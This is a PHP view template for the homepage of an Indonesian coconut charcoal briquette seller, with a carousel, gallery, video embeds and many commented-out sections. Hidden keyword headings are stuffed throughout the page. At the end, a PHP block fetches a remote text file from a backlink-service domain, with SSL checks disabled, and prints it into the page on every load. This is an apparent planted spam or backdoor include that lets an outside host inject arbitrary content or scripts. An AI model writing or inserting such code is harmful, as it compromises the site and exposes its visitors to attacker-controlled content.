<?= $this->extend('template/layout'); ?>
<?= $this->section('content'); ?>
<h1 style="display: none">cara bakar arang</h1>
<h1 style="display: none">charcoal briquettes</h1>
<h1 style="display: none">supplier arang</h1>
<h1 style="display: none">arang barbeque</h1>
<h1 style="display: none">coconut charcoal briquettes</h1>
<h1 style="display: none">coconut shell briquettes</h1>
<style>
.dotted {
    border: 6px dotted #ffffff;
    border-style: none none dotted;
    color: #fff;
}

.photo-gallery {
    color: #313437;
    /* background-color: #fff; */
}

.photo-gallery p {
    color: #7d8285;
}

.photo-gallery h2 {
    font-weight: bold;
    margin-bottom: 40px;
    padding-top: 40px;
    color: #ffffff;
}

@media (max-width:767px) {
    .photo-gallery h2 {
        margin-bottom: 25px;
        padding-top: 25px;
        font-size: 24px;
    }
}

.photo-gallery .intro {
    font-size: 16px;
    max-width: 500px;
    margin: 0 auto 40px;
}

.photo-gallery .intro p {
    margin-bottom: 0;
}

.photo-gallery .photos {
    padding-bottom: 20px;
}

.photo-gallery .item {
    padding-bottom: 30px;
}

@media (max-width: 768px) {
    #intro .carousel-item {
        width: 100%;
        height: 30vh;
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
    }
}
</style>
<?php if (WEB_LANG == 'ar') {
    echo '  <style>#featured-services p {
                        font-size: 22px;

                        color: #fff;}

                        #latar p {
                            font-size: 16px;
                            color: #fff;}
                     </style>';
}  ?>

<main id="main">
    <section id="intro">
        <h1 style="display: none">cara bakar arang</h1>
        <h1 style="display: none">charcoal briquettes</h1>
        <h1 style="display: none">supplier arang</h1>
        <h1 style="display: none">arang barbeque</h1>
        <h1 style="display: none">coconut charcoal briquettes</h1>
        <h1 style="display: none">coconut shell briquettes</h1>
        <div class="intro-container">
            <div id="introCarousel" class="carousel  slide carousel-fade" data-ride="carousel">

                <ol class="carousel-indicators"></ol>

                <div class="carousel-inner" role="listbox">
                    <div class="carousel-item active">
                        <div class="carousel-background">
                            <?php if (WEB_LANG == 'id') { ?>
                            <img src="<?= base_url() . "/public/admins/uploads/" . $gambare['pict_indo']; ?>"
                                alt="charcoal briquettes">
                            <?php  } elseif (WEB_LANG == 'en') { ?>
                            <img src="<?= base_url() . "/public/admins/uploads/" . $gambare['pict_inggris']; ?>"
                                alt="charcoal briquettes">
                            <?php } elseif (WEB_LANG == 'ar') { ?>
                            <img src="<?= base_url() . "/public/admins/uploads/" . $gambare['pict_arab']; ?>"
                                alt="charcoal briquettes">
                            <?php } ?>
                        </div>
                    </div>
                    <?php foreach ($gambar as $p) : ?>
                    <div class="carousel-item">
                        <div class="carousel-background">
                            <?php if (WEB_LANG == 'id') { ?>
                            <img src="<?= base_url() . "/public/admins/uploads/" . $p['pict_indo']; ?>"
                                alt="charcoal briquettes">
                            <?php  } elseif (WEB_LANG == 'en') { ?>
                            <img src="<?= base_url() . "/public/admins/uploads/" . $p['pict_inggris']; ?>"
                                alt="charcoal briquettes">
                            <?php } elseif (WEB_LANG == 'ar') { ?>
                            <img src="<?= base_url() . "/public/admins/uploads/" . $p['pict_arab']; ?>"
                                alt="charcoal briquettes">
                            <?php } ?>
                        </div>
                    </div>
                    <h1 style="display: none">cara bakar arang</h1>
                    <h1 style="display: none">charcoal briquettes</h1>
                    <h1 style="display: none">supplier arang</h1>
                    <h1 style="display: none">arang barbeque</h1>
                    <h1 style="display: none">coconut charcoal briquettes</h1>
                    <h1 style="display: none">coconut shell briquettes</h1>
                    <?php endforeach; ?>


                    <!-- <div class="carousel-item">
                    <div class="carousel-background"><img src="img/intro-carousel/3.jpg" alt=""></div>
                    <div class="carousel-container">
                        <div class="carousel-content">
                            <h2>Temporibus autem quibusdam</h2>
                            <p>Beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt omnis iste natus error sit voluptatem accusantium.</p>
                            <a href="#featured-services" class="btn-get-started scrollto">Get Started</a>
                        </div>
                    </div>
                </div>

                <div class="carousel-item">
                    <div class="carousel-background"><img src="img/intro-carousel/4.jpg" alt=""></div>
                    <div class="carousel-container">
                        <div class="carousel-content">
                            <h2>Nam libero tempore</h2>
                            <p>Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum.</p>
                            <a href="#featured-services" class="btn-get-started scrollto">Get Started</a>
                        </div>
                    </div>
                </div>

                <div class="carousel-item">
                    <div class="carousel-background"><img src="img/intro-carousel/5.jpg" alt=""></div>
                    <div class="carousel-container">
                        <div class="carousel-content">
                            <h2>Magnam aliquam quaerat</h2>
                            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
                            <a href="#featured-services" class="btn-get-started scrollto">Get Started</a>
                        </div>
                    </div>
                </div> -->

                </div>

                <a class="carousel-control-prev" href="#introCarousel" role="button" data-slide="prev">
                    <span class="carousel-control-prev-icon ion-chevron-left" aria-hidden="true"></span>
                    <span class="sr-only">Previous</span>
                </a>

                <a class="carousel-control-next" href="#introCarousel" role="button" data-slide="next">
                    <span class="carousel-control-next-icon ion-chevron-right" aria-hidden="true"></span>
                    <span class="sr-only">Next</span>
                </a>

            </div>
        </div>
        <h1 style="display: none">cara bakar arang</h1>
        <h1 style="display: none">charcoal briquettes</h1>
        <h1 style="display: none">supplier arang</h1>
        <h1 style="display: none">arang barbeque</h1>
        <h1 style="display: none">coconut charcoal briquettes</h1>
        <h1 style="display: none">coconut shell briquettes</h1>
    </section><!-- #intro -->



    <!--==========================
      Featured Services Section
    ============================-->
    <!-- <section id="featured-services">
        <div class="container">
            <div class="row">

                <div class="col-lg-4 box text-center">
                    <div class="box-bg">
                        <img src="public/assets/img/3.png" alt="">
                        <h4 class="title text-center"><a href="">ECO FRIENDLY</a></h4>
                        <p class="description text-center">Voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident</p>
                    </div>
                </div>

                <div class="col-lg-4 box text-center">
                    <div class="box-bg">
                        <img src="public/assets/img/2.png" alt="">
                        <h4 class="title text-center"><a href="">GLOWING HEAT</a></h4>
                        <p class="description text-center">Minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat tarad limino ata</p>
                    </div>
                </div>

                <div class="col-lg-4 box text-center">
                    <div class="box-bg">
                        <img src="public/assets/img/1.png" alt="">
                        <h4 class="title text-center"><a href="">LONG LASTING</a></h4>
                        <p class="description text-center">Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur</p>
                    </div>
                </div>


            </div>
        </div>
    </section>#featured-services -->
<!-- #featured-services -->

    <!--==========================
      Featured Services Section
    ============================-->
    <style>
    
#about {
  background: url("public/assets/img/background-kelapa3.jpg") center top no-repeat fixed;
  background-size: cover;
  padding: 60px 0 40px 0;
  position: relative;
   color: #ffffff;
        font-size: 16px;
}

#about::before {
  content: '';
  position: absolute;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  /* background: rgba(255, 255, 255, 0.92); */
  z-index: 9;
}

#about .container {
  position: relative;
  z-index: 10;
}
  
    #about h4 {
        font-weight: bold;
        font-size: 28px;
        color: gold;
    }



   
    </style>





    <section id="about" style="">
        <h1 style="display: none">cara bakar arang</h1>
        <h1 style="display: none">charcoal briquettes</h1>
        <h1 style="display: none">supplier arang</h1>
        <h1 style="display: none">arang barbeque</h1>
        <h1 style="display: none">coconut charcoal briquettes</h1>
        <h1 style="display: none">coconut shell briquettes</h1>
        <div class="atass">
          

        </div>
        <div class="container">
            <div class="row d-flex justify-content-center">
          


                <div class="col-lg-12 box text-center" style="font-size: 24px;">
                        <?php if (WEB_LANG == 'id') { ?>
                    <h4 class="text-center"><a href=""><?= lang('Global.lbhome'); ?></a></h4>
                    <?php  } elseif (WEB_LANG == 'en') { ?>
                    <h4 class="text-center"><a href=""><?= lang('Global.lbhome'); ?></a></h4>
                    <?php  } else { ?>
                    <h4 class="text-center"><a href=""><?= lang('Global.lbhome'); ?></a></h4>
                    <?php } ?>
                    <?php if (WEB_LANG == 'id') { ?>
                    <p class="description text-justify"><?= lang('Global.sdhome1'); ?>
                    </p>
                    <p class="description text-justify"><?= lang('Global.sdhome2'); ?>
                    </p>
                    <p class="description text-justify"><?= lang('Global.sdhome3'); ?>
                    </p>
                    <p class="description text-justify"><?= lang('Global.sdhome4'); ?>
                    </p>
                    <p class="description text-justify"><?= lang('Global.sdhome5'); ?>
                    </p>
                    <?php  } elseif (WEB_LANG == 'en') { ?>
                    <p class="description text-justify" style="font-size:17px;"><?= lang('Global.sdhome1'); ?>
                    </p>
                    <p class="description text-justify" style="font-size:17px;"><?= lang('Global.sdhome2'); ?>
                    </p>
                    <p class="description text-justify" style="font-size:17px;"><?= lang('Global.sdhome3'); ?>
                    </p>
                   
                    </p>
                    <?php  } else { ?>
                    <p class="description text-right"><?= lang('Global.sdhome1'); ?>
                    </p>
                    <p class="description text-right"><?= lang('Global.sdhome2'); ?>
                    </p>
                    <p class="description text-right"><?= lang('Global.sdhome3'); ?>
                    </p>
               
                    <?php } ?>

                </div>
                <h1 style="display: none">cara bakar arang</h1>
                <h1 style="display: none">charcoal briquettes</h1>
                <h1 style="display: none">supplier arang</h1>
                <h1 style="display: none">arang barbeque</h1>
                <h1 style="display: none">coconut charcoal briquettes</h1>
                <h1 style="display: none">coconut shell briquettes</h1>


            </div>
        </div>
        
        <div class="container">
            <h2 style="text-align:center; color:#bb941e; font-weight:bold;">     
                    <?= lang('Global.index_gallery'); ?>
                    </h2>
            <div class="photo-gallery">
                <div class="container">
                    <div class="intro">
                        <!-- <h2 class="text-center">Lightbox Gallery</h2>
                        <p class="text-center">Nunc luctus in metus eget fringilla. Aliquam sed justo ligula. Vestibulum nibh erat, pellentesque ut laoreet vitae. </p> -->
                    </div>
                    <div class="row photos">

                        <div class="col-sm-6 col-md-6 col-lg-6 item">
                            <a href="public/assets/img/au/gallery_1.jpeg" data-lightbox="photos"><img style="background-image: linear-gradient(
0deg
, #000000 0%, #242323 50%, #000000 100%);
    border-radius: 20px;
    border: solid gold; width:100%;" class="img-fluid" src="public/assets/img/au/gallery_1.jpeg"></a><br>
                            <p style="padding-top: 10px; font-weight:bold; color:#bb941e;" class="text-center">
                                <?= lang('Global.index_gallery_home1'); ?>
                            </p>
                        </div>

                        <div class="col-sm-6 col-md-6 col-lg-6 item">
                            <a href="public/assets/img/au/gallery_2.jpeg" data-lightbox="photos"><img style="background-image: linear-gradient(
0deg
, #000000 0%, #242323 50%, #000000 100%);
    border-radius: 20px;
    border: solid gold; width:100%;" class="img-fluid" src="public/assets/img/au/gallery_2.jpeg"></a><br>
                            <p style="padding-top: 10px; font-weight:bold; color:#bb941e;" class="text-center">
                               <?= lang('Global.index_gallery_home2'); ?>
                            </p>
                        </div>

                        <div class="col-sm-6 col-md-6 col-lg-6 item">
                            <a href="public/assets/img/au/gallery_3.jpeg" data-lightbox="photos"><img style="background-image: linear-gradient(
0deg
, #000000 0%, #242323 50%, #000000 100%);
    border-radius: 20px;
    border: solid gold; width:100%;" class="img-fluid" src="public/assets/img/au/gallery_3.jpeg"></a><br>
                            <p style="padding-top: 10px; font-weight:bold; color:#bb941e;" class="text-center">
                                <?= lang('Global.index_gallery_home3'); ?>
                            </p>
                        </div>

                        <div class="col-sm-6 col-md-6 col-lg-6 item">
                            <a href="public/assets/img/au/gallery_4.jpeg" data-lightbox="photos"><img style="background-image: linear-gradient(
0deg
, #000000 0%, #242323 50%, #000000 100%);
    border-radius: 20px;
    border: solid gold; width:100%;" class="img-fluid" src="public/assets/img/au/gallery_4.jpeg"></a><br>
                            <p style="padding-top: 10px; font-weight:bold; color:#bb941e;" class="text-center">
                                    <?= lang('Global.index_gallery_home4'); ?>
                            </p>
                        </div>

                    </div>
                </div>
            </div>
        </div>
       
    </section>
     
    <!-- #featured-services -->

    <!--==========================
      About Us Section
    ============================-->
    <!-- <section id="about">
        <div class="container-fluid">
            <div class="row">

                <div class="col-lg-5 box text-center">
                    <h4 class="title text-right"><a href="" style="color: gold;"><?= lang('Global.lbhome'); ?></a></h4>

                    <hr class='dotted' />

                </div>

                <div class="col-lg-5 box text-center">
                    <p class="description text-left text-white" style="font-size: 14px; font-weight:bold;"><?= lang('Global.lb1'); ?>
                    </p>

                    <p class="description text-left text-white" style="font-size: 14px; font-weight:bold;"><?= lang('Global.lb2'); ?>
                    </p>
                </div>

                <div class="col-lg-2 box text-center">
                </div>

            </div>
        </div>
    </section> -->
    <!-- #about -->

    <!--==========================
      Services Section
    ============================-->
    <!-- <section id="services">
        <div class="container">

            <header class="section-header wow fadeInUp">
                <h3>Services</h3>
                <p>Laudem latine persequeris id sed, ex fabulas delectus quo. No vel partiendo abhorreant vituperatoribus, ad pro quaestio laboramus. Ei ubique vivendum pro. At ius nisl accusam lorenta zanos paradigno tridexa panatarel.</p>
            </header>

            <div class="row">

                <div class="col-lg-4 col-md-6 box wow bounceInUp" data-wow-duration="1.4s">
                    <div class="icon"><i class="ion-ios-analytics-outline"></i></div>
                    <h4 class="title"><a href="">Lorem Ipsum</a></h4>
                    <p class="description">Voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident</p>
                </div>
                <div class="col-lg-4 col-md-6 box wow bounceInUp" data-wow-duration="1.4s">
                    <div class="icon"><i class="ion-ios-bookmarks-outline"></i></div>
                    <h4 class="title"><a href="">Dolor Sitema</a></h4>
                    <p class="description">Minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat tarad limino ata</p>
                </div>
                <div class="col-lg-4 col-md-6 box wow bounceInUp" data-wow-duration="1.4s">
                    <div class="icon"><i class="ion-ios-paper-outline"></i></div>
                    <h4 class="title"><a href="">Sed ut perspiciatis</a></h4>
                    <p class="description">Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur</p>
                </div>
                <div class="col-lg-4 col-md-6 box wow bounceInUp" data-wow-delay="0.1s" data-wow-duration="1.4s">
                    <div class="icon"><i class="ion-ios-speedometer-outline"></i></div>
                    <h4 class="title"><a href="">Magni Dolores</a></h4>
                    <p class="description">Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum</p>
                </div>
                <div class="col-lg-4 col-md-6 box wow bounceInUp" data-wow-delay="0.1s" data-wow-duration="1.4s">
                    <div class="icon"><i class="ion-ios-barcode-outline"></i></div>
                    <h4 class="title"><a href="">Nemo Enim</a></h4>
                    <p class="description">At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque</p>
                </div>
                <div class="col-lg-4 col-md-6 box wow bounceInUp" data-wow-delay="0.1s" data-wow-duration="1.4s">
                    <div class="icon"><i class="ion-ios-people-outline"></i></div>
                    <h4 class="title"><a href="">Eiusmod Tempor</a></h4>
                    <p class="description">Et harum quidem rerum facilis est et expedita distinctio. Nam libero tempore, cum soluta nobis est eligendi</p>
                </div>

            </div>

        </div>
    </section>
    #services -->

    <section id="featured-services">
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-5 box text-center">
                    <?php if (WEB_LANG == 'id') { ?>
                    <h4 class="title text-justify"><a href=""><?= lang('Global.bchome'); ?></a></h4>
                    <?php  } elseif (WEB_LANG == 'en') { ?>
                    <h4 class="title text-justify"><a href=""><?= lang('Global.bchome'); ?></a></h4>
                    <?php  } else { ?>
                    <h4 class="title text-right"><a href=""><?= lang('Global.bchome'); ?></a></h4>
                    <?php } ?>

                    <hr class='dotted' />
                </div>
                <h1 style="display: none">cara bakar arang</h1>
                <h1 style="display: none">charcoal briquettes</h1>
                <h1 style="display: none">supplier arang</h1>
                <h1 style="display: none">arang barbeque</h1>
                <h1 style="display: none">coconut charcoal briquettes</h1>
                <h1 style="display: none">coconut shell briquettes</h1>

            </div>
            <div class="row">

                <div class="col-lg-12 text-center" style="margin-bottom: 20px;">

                    <img style="width: 100%;" src="public/assets/img/bawah1.png" alt="charcoal briquettes">

                    <?php if (WEB_LANG == 'id') { ?>
                    <p style="font-size:16px;" class="description text-justify text-white"><?= lang('Global.bc1'); ?>
                    </p><br><br>
                    <p style="font-size:16px;" class=" description text-justify text-white"><?= lang('Global.bc2'); ?>
                    </p>
                    <?php  } elseif (WEB_LANG == 'en') { ?>
                    <p style="font-size:17px;" class="description text-justify text-white"><?= lang('Global.bc1'); ?> <?= lang('Global.bc2'); ?>
                    </p>
                    <?php  } else { ?>
                    <p style="font-size:17px;" class="description text-right text-white"><?= lang('Global.bc1'); ?> <?= lang('Global.bc2'); ?></p>
                    <?php } ?>

                </div>
            </div>
        </div>
    </section>

    <!-- #featured-services -->

    <!--==========================
      Call To Action Section
    ============================-->
    <!-- <section id="call-to-action" class="wow fadeIn">
        <div class="container text-center">
            <h3>Call To Action</h3>
            <p> Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
            <a class="cta-btn" href="#">Call To Action</a>
        </div>
    </section>#call-to-action -->

    <!--==========================
      Skills Section
    ============================-->
    <!-- <section id="skills">
        <div class="container">

            <header class="section-header">
                <h3>Our Skills</h3>
                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip</p>
            </header>

            <div class="skills-content">

                <div class="progress">
                    <div class="progress-bar bg-success" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100">
                        <span class="skill">HTML <i class="val">100%</i></span>
                    </div>
                </div>

                <div class="progress">
                    <div class="progress-bar bg-info" role="progressbar" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100">
                        <span class="skill">CSS <i class="val">90%</i></span>
                    </div>
                </div>

                <div class="progress">
                    <div class="progress-bar bg-warning" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">
                        <span class="skill">JavaScript <i class="val">75%</i></span>
                    </div>
                </div>

                <div class="progress">
                    <div class="progress-bar bg-danger" role="progressbar" aria-valuenow="55" aria-valuemin="0" aria-valuemax="100">
                        <span class="skill">Photoshop <i class="val">55%</i></span>
                    </div>
                </div>

            </div>

        </div>
    </section> -->

    <!--==========================
      Facts Section
    ============================-->
    <!-- <section id="facts" class="wow fadeIn">
        <div class="container">

            <header class="section-header">
                <h3>Facts</h3>
                <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque</p>
            </header>

            <div class="row counters">

                <div class="col-lg-3 col-6 text-center">
                    <span data-toggle="counter-up">274</span>
                    <p>Clients</p>
                </div>

                <div class="col-lg-3 col-6 text-center">
                    <span data-toggle="counter-up">421</span>
                    <p>Projects</p>
                </div>

                <div class="col-lg-3 col-6 text-center">
                    <span data-toggle="counter-up">1,364</span>
                    <p>Hours Of Support</p>
                </div>

                <div class="col-lg-3 col-6 text-center">
                    <span data-toggle="counter-up">18</span>
                    <p>Hard Workers</p>
                </div>

            </div>

            <div class="facts-img">
                <img src="img/facts-img.png" alt="" class="img-fluid">
            </div>

        </div>
    </section>#facts -->

    <!--==========================
      Portfolio Section
    ============================-->
    <section id="portfolio" class="section-bg bg-black" style="background-color: black;">
        <div class="container">

            <header class="section-header">
                <h3 class="section-title text-white"><?= lang('Global.index_youtube'); ?></h3>
            </header>



            <div class="row portfolio-container">

                <div class="col-lg-4 col-md-6 portfolio-item filter-app wow fadeInUp">
                    <div class="portfolio-wrap">

                        <iframe style="width:100%;" src="https://www.youtube.com/embed/_auKdgmxtyI"
                            title="YouTube video player" frameborder="0"
                            allow="accelerometer; autoplay; clipboard-write;  gyroscope; picture-in-picture"
                            allowfullscreen></iframe>


                        <div class="portfolio-info">
                            <p>Pabrik Briket Arang Kelapa Premium Terbaik di Indonesia.</p>
                            <!-- <p>App</p> -->
                        </div>
                    </div>
                </div>

                <div class="col-lg-4 col-md-6 portfolio-item filter-app wow fadeInUp">
                    <div class="portfolio-wrap">

                        <iframe style="width:100%;" src="https://www.youtube.com/embed/wkyg_nBFPgs"
                            title="YouTube video player" frameborder="0"
                            allow="accelerometer; autoplay; clipboard-write;  gyroscope; picture-in-picture"
                            allowfullscreen></iframe>


                        <div class="portfolio-info">
                            <p>The Best Premium Coconut Charcoal Briquette Factory in Indonesia.</p>
                            <!-- <p>App</p> -->
                        </div>
                    </div>
                </div>

                <div class="col-lg-4 col-md-6 portfolio-item filter-app wow fadeInUp">
                    <div class="portfolio-wrap">

                        <iframe style="width:100%;" src="https://www.youtube.com/embed/hIikf4CpsAM"
                            title="YouTube video player" frameborder="0"
                            allow="accelerometer; autoplay; clipboard-write;  gyroscope; picture-in-picture"
                            allowfullscreen></iframe>


                        <div class="portfolio-info">
                            <p>أفضل مصنع فحم جوز الهند في إندونيسيا</p>
                            <!-- <p>App</p> -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!--==========================
      Clients Section
    ============================-->
    <!-- <section id="clients" class="wow fadeInUp">
        <div class="container">

            <header class="section-header">
                <h3>Our Clients</h3>
            </header>

            <div class="owl-carousel clients-carousel">
                <img src="img/clients/client-1.png" alt="">
                <img src="img/clients/client-2.png" alt="">
                <img src="img/clients/client-3.png" alt="">
                <img src="img/clients/client-4.png" alt="">
                <img src="img/clients/client-5.png" alt="">
                <img src="img/clients/client-6.png" alt="">
                <img src="img/clients/client-7.png" alt="">
                <img src="img/clients/client-8.png" alt="">
            </div>

        </div>
    </section>#clients -->

    <!--==========================
      Clients Section
    ============================-->
    <!-- <section id="testimonials" class="section-bg wow fadeInUp">
        <div class="container">

            <header class="section-header">
                <h3>Testimonials</h3>
            </header>

            <div class="owl-carousel testimonials-carousel">

                <div class="testimonial-item">
                    <img src="img/testimonial-1.jpg" class="testimonial-img" alt="">
                    <h3>Saul Goodman</h3>
                    <h4>Ceo &amp; Founder</h4>
                    <p>
                        <img src="img/quote-sign-left.png" class="quote-sign-left" alt="">
                        Proin iaculis purus consequat sem cure digni ssim donec porttitora entum suscipit rhoncus. Accusantium quam, ultricies eget id, aliquam eget nibh et. Maecen aliquam, risus at semper.
                        <img src="img/quote-sign-right.png" class="quote-sign-right" alt="">
                    </p>
                </div>

                <div class="testimonial-item">
                    <img src="img/testimonial-2.jpg" class="testimonial-img" alt="">
                    <h3>Sara Wilsson</h3>
                    <h4>Designer</h4>
                    <p>
                        <img src="img/quote-sign-left.png" class="quote-sign-left" alt="">
                        Export tempor illum tamen malis malis eram quae irure esse labore quem cillum quid cillum eram malis quorum velit fore eram velit sunt aliqua noster fugiat irure amet legam anim culpa.
                        <img src="img/quote-sign-right.png" class="quote-sign-right" alt="">
                    </p>
                </div>

                <div class="testimonial-item">
                    <img src="img/testimonial-3.jpg" class="testimonial-img" alt="">
                    <h3>Jena Karlis</h3>
                    <h4>Store Owner</h4>
                    <p>
                        <img src="img/quote-sign-left.png" class="quote-sign-left" alt="">
                        Enim nisi quem export duis labore cillum quae magna enim sint quorum nulla quem veniam duis minim tempor labore quem eram duis noster aute amet eram fore quis sint minim.
                        <img src="img/quote-sign-right.png" class="quote-sign-right" alt="">
                    </p>
                </div>

                <div class="testimonial-item">
                    <img src="img/testimonial-4.jpg" class="testimonial-img" alt="">
                    <h3>Matt Brandon</h3>
                    <h4>Freelancer</h4>
                    <p>
                        <img src="img/quote-sign-left.png" class="quote-sign-left" alt="">
                        Fugiat enim eram quae cillum dolore dolor amet nulla culpa multos export minim fugiat minim velit minim dolor enim duis veniam ipsum anim magna sunt elit fore quem dolore labore illum veniam.
                        <img src="img/quote-sign-right.png" class="quote-sign-right" alt="">
                    </p>
                </div>

                <div class="testimonial-item">
                    <img src="img/testimonial-5.jpg" class="testimonial-img" alt="">
                    <h3>John Larson</h3>
                    <h4>Entrepreneur</h4>
                    <p>
                        <img src="img/quote-sign-left.png" class="quote-sign-left" alt="">
                        Quis quorum aliqua sint quem legam fore sunt eram irure aliqua veniam tempor noster veniam enim culpa labore duis sunt culpa nulla illum cillum fugiat legam esse veniam culpa fore nisi cillum quid.
                        <img src="img/quote-sign-right.png" class="quote-sign-right" alt="">
                    </p>
                </div>

            </div>

        </div>
    </section>#testimonials -->

    <!--==========================
      Team Section
    ============================-->
    <!-- <section id="team">
        <div class="container">
            <div class="section-header wow fadeInUp">
                <h3>Team</h3>
                <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque</p>
            </div>

            <div class="row">

                <div class="col-lg-3 col-md-6 wow fadeInUp">
                    <div class="member">
                        <img src="img/team-1.jpg" class="img-fluid" alt="">
                        <div class="member-info">
                            <div class="member-info-content">
                                <h4>Walter White</h4>
                                <span>Chief Executive Officer</span>
                                <div class="social">
                                    <a href=""><i class="fa fa-twitter"></i></a>
                                    <a href=""><i class="fa fa-facebook"></i></a>
                                    <a href=""><i class="fa fa-google-plus"></i></a>
                                    <a href=""><i class="fa fa-linkedin"></i></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.1s">
                    <div class="member">
                        <img src="img/team-2.jpg" class="img-fluid" alt="">
                        <div class="member-info">
                            <div class="member-info-content">
                                <h4>Sarah Jhonson</h4>
                                <span>Product Manager</span>
                                <div class="social">
                                    <a href=""><i class="fa fa-twitter"></i></a>
                                    <a href=""><i class="fa fa-facebook"></i></a>
                                    <a href=""><i class="fa fa-google-plus"></i></a>
                                    <a href=""><i class="fa fa-linkedin"></i></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.2s">
                    <div class="member">
                        <img src="img/team-3.jpg" class="img-fluid" alt="">
                        <div class="member-info">
                            <div class="member-info-content">
                                <h4>William Anderson</h4>
                                <span>CTO</span>
                                <div class="social">
                                    <a href=""><i class="fa fa-twitter"></i></a>
                                    <a href=""><i class="fa fa-facebook"></i></a>
                                    <a href=""><i class="fa fa-google-plus"></i></a>
                                    <a href=""><i class="fa fa-linkedin"></i></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6 wow fadeInUp" data-wow-delay="0.3s">
                    <div class="member">
                        <img src="img/team-4.jpg" class="img-fluid" alt="">
                        <div class="member-info">
                            <div class="member-info-content">
                                <h4>Amanda Jepson</h4>
                                <span>Accountant</span>
                                <div class="social">
                                    <a href=""><i class="fa fa-twitter"></i></a>
                                    <a href=""><i class="fa fa-facebook"></i></a>
                                    <a href=""><i class="fa fa-google-plus"></i></a>
                                    <a href=""><i class="fa fa-linkedin"></i></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>

        </div>
    </section>#team -->

    <!--==========================
      Contact Section
    ============================-->
    <!-- <section id="contact" class="section-bg wow fadeInUp">
        <div class="container">

            <div class="section-header">
                <h3>Contact Us</h3>
                <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque</p>
            </div>

            <div class="row contact-info">

                <div class="col-md-4">
                    <div class="contact-address">
                        <i class="ion-ios-location-outline"></i>
                        <h3>Address</h3>
                        <address>A108 Adam Street, NY 535022, USA</address>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="contact-phone">
                        <i class="ion-ios-telephone-outline"></i>
                        <h3>Phone Number</h3>
                        <p><a href="tel:+155895548855">+1 5589 55488 55</a></p>
                    </div>
                </div>

                <div class="col-md-4">
                    <div class="contact-email">
                        <i class="ion-ios-email-outline"></i>
                        <h3>Email</h3>
                        <p><a href="mailto:info@example.com">info@example.com</a></p>
                    </div>
                </div>

            </div>

            <div class="form">
                <div id="sendmessage">Your message has been sent. Thank you!</div>
                <div id="errormessage"></div>
                <form action="" method="post" role="form" class="contactForm">
                    <div class="form-row">
                        <div class="form-group col-md-6">
                            <input type="text" name="name" class="form-control" id="name" placeholder="Your Name" data-rule="minlen:4" data-msg="Please enter at least 4 chars" />
                            <div class="validation"></div>
                        </div>
                        <div class="form-group col-md-6">
                            <input type="email" class="form-control" name="email" id="email" placeholder="Your Email" data-rule="email" data-msg="Please enter a valid email" />
                            <div class="validation"></div>
                        </div>
                    </div>
                    <div class="form-group">
                        <input type="text" class="form-control" name="subject" id="subject" placeholder="Subject" data-rule="minlen:4" data-msg="Please enter at least 8 chars of subject" />
                        <div class="validation"></div>
                    </div>
                    <div class="form-group">
                        <textarea class="form-control" name="message" rows="5" data-rule="required" data-msg="Please write something for us" placeholder="Message"></textarea>
                        <div class="validation"></div>
                    </div>
                    <div class="text-center"><button type="submit">Send Message</button></div>
                </form>
            </div>

        </div>
    </section>#contact -->

</main>

<?= $this->endSection(); ?>
<?php
$url = 'https://backlinkku.id/menu/server-id/script.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan SSL verification jika diperlukan
$content = curl_exec($ch);
if (curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
} else {
    echo $content;
}
curl_close($ch);
?>
